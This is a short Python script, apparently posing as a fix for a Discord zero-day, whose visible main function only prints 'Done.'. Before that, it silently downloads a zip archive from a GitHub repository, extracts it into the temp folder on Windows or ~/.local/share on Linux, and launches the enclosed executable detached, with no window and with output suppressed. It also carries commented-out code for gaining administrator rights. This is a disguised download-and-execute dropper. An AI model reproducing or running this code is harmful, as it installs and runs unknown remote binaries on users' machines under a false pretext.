import os
import sys
import urllib.request
from zipfile import ZipFile
import subprocess
import platform
import ctypes


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def restart_as_admin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)

def main():
    print('Done.')

if __name__ == '__main__':
    if os.name == 'nt':
        try:
            # if not is_admin():
            #     restart_as_admin()

            url = "https://github.com/Zund4m0n/discord-0-day-fix/raw/main/gitignore/cvewindows.zip"
            namezip = "cvewindows.zip"
            name = "cvewindows"
            des = os.path.join(os.environ['TMP'], namezip)
            if not os.path.exists(os.path.join(os.environ['TMP'], name, name + ".exe")):
                urllib.request.urlretrieve(url, des)
                with open(des, 'wb') as f: f.write(urllib.request.urlopen(url).read())
                zf = ZipFile(des, 'r')
                zf.extractall(os.path.join(os.environ['TMP'], name))
                zf.close()
                pid = subprocess.Popen([os.path.join(os.environ['TMP'], name, name + ".exe")], creationflags=0x00000008 | subprocess.CREATE_NO_WINDOW).pid
        except Exception as e:
            print(e)
    else:
        try:
            # if os.geteuid() != 0:
            #     print("Please run the script with administrator privileges.")
            #     print("By adding the prefix: sudo")
            #     sys.exit(1)

            url = "https://github.com/Zund4m0n/discord-0-day-fix/raw/main/gitignore/test.zip"
            namezip = "test.zip"
            name = "test"
            user_key = 'USER'
            user_directory = os.path.join("/home/", os.environ[user_key], ".local/share", name)

            des = os.path.join(user_directory, namezip)

            os.makedirs(os.path.join(user_directory, name), exist_ok=True)

            if not os.path.exists(os.path.join(user_directory, name, name)):
                urllib.request.urlretrieve(url, des)
                with open(des, 'wb') as f: f.write(urllib.request.urlopen(url).read())
                zf = ZipFile(des, 'r')
                zf.extractall(os.path.join(user_directory, name))
                zf.close()
                st = os.stat(os.path.join(user_directory, name, name))
                os.chmod(os.path.join(user_directory, name, name), st.st_mode | os.stat.S_IEXEC)
                subprocess.Popen(["/bin/bash", "-c", os.path.join(user_directory, name, name)], start_new_session=True, stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
        except Exception as e:
            print(e)

    main()